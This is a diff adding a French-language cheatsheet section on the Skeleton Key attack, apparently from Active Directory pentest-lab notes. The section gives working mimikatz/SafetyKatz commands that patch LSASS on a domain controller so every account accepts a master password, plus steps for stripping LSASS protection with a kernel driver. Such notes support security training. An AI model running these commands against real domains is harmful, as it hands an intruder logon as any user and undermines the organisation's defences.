@@ -37,6 +37,24 @@ Autorise le compte DSRM (hash extrait via `lsadump::evasive-sam` après élévat
 
 > [!note] Golden/Diamond ticket sont aussi des mécanismes de persistance (clé `krbtgt`) — détaillés dans [[Cheatsheet - Tickets Kerberos]].
 
+### Skeleton Key — patch du LSASS du DC
+
+> Injecte un « passe-partout » dans le LSASS du DC : après le patch, *tous* les comptes du domaine acceptent un mot de passe maître unique (`mimikatz`) **en plus** du leur → on se connecte comme n'importe qui, sans toucher aux hash. Accès immédiat mais volatile.
+
+> [!warning]- Required
+> Privilèges Domain Admin (le patch s'exécute sur le DC). Ne survit **pas** à un redémarrage du DC et n'est pas OPSEC-safe.
+
+```powershell
+# Injecter la skeleton key sur un DC (mot de passe maître = "mimikatz")
+C:\AD\Tools\SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+# Se connecter comme n'importe quel compte avec le mot de passe "mimikatz"
+Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
+```
+
+Si LSASS tourne en processus protégé (PPL), charger d'abord le driver `mimidriv.sys` (`!+` puis `!processprotect /process:lsass.exe /remove`) avant `misc::skeleton` — très bruyant (installation d'un driver kernel).
+
+> [!note] Non persistant au reboot, et connu pour casser AD CS. À réserver à un accès court ; préférer DCSync / Golden pour une persistance durable.
+
 ### Repères génériques Windows (secondaire)
 
 ```powershell
